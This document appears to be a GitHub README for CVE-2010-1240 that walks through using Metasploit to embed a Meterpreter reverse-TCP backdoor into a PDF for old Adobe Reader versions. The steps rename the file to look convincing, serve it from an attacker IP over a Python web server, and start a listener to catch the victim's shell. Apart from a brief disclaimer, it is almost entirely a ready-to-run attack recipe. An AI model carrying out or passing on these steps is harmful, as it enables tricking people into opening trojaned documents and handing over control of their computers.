<h1 style="font-size:10vw" align="left">CVE-2010-1240 - Embedding backdoor into a PDF</h1>


<img src="https://img.shields.io/badge/CVSS:2.0%20Score%20-9.3 HIGH-red"> [![Python](https://img.shields.io/badge/Python-%E2%89%A5%203.11-blueviolet.svg)](https://www.python.org/) <img src="https://img.shields.io/badge/Metasploitable%20-Yes-blue">


******
⚠️ *For educational and authorized security research purposes only*


## Description
Adobe Reader and Acrobat 9.x before 9.3.3, and 8.x before 8.2.3 on Windows and Mac OS X, do not restrict the contents of one text field in the Launch File warning dialog, which makes it easier for remote attackers to trick users into executing an arbitrary local program that was specified in a PDF document, as demonstrated by a text field that claims that the Open button will enable the user to read an encrypted message.


## Demo
![Animation](https://github.com/asepsaepdin/CVE-2010-1240/assets/122620685/2bbfd368-ecbf-44a2-88dd-a95add3e886c)


## Step Guides
1. First, run msfconsole

   ```bash
   msfconsole
   ```

2. Then, set the payload for embedding the pdf

   ```bash
   use exploit/windows/fileformat/adobe_pdf_embedded_exe
   ```

3. set the INFILENAME option and provide direct path to the original pdf file

   ```bash
   set INFILENAME /home/kali/Downloads/certificate-foundations-of-threat-hunting-60c893e734422a67991e093c.pdf
   ```

4. set the name of the newly created malicious PDF file to something more convincing by setting the FILENAME option

   ```bash
   set FILENAME laporan.pdf
   ```

5. Find and embed the payload into the PDF file

   ```bash
   set payload windows/meterpreter/reverse_tcp
   ```

6. Set LHOST option to and attacker's IP

   ```bash
   set LHOST 172.16.10.10
   ```

7. Open a new terminal and navigate to the location of the malicious PDF file

   ```bash
   cd .msf4/local/
   ```

8. Create a temporary server in python

   ```bash
   python -m http.server
   ```

9. Download the malicious PDF file on the victim's machine

   ```bash
   http://172.16.10.10:8000/certificate.pdf
   ```

10. Before running the malicious PDF file on the victim's machine, start the listener on the previous terminal
    
    ```bash
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
    set LHOST 172.16.10.10
    exploit
    ```
    
11. Once the malicious PDF file is executed on the victim machine, it will give you connection to the victim's machine


## Credits
- https://nvd.nist.gov/vuln/detail/CVE-2010-1240
- https://medium.com/purple-team/embedding-backdoor-into-pdf-files-1781dfce62b1
- https://github.com/Jasmoon99/Embedded-PDF
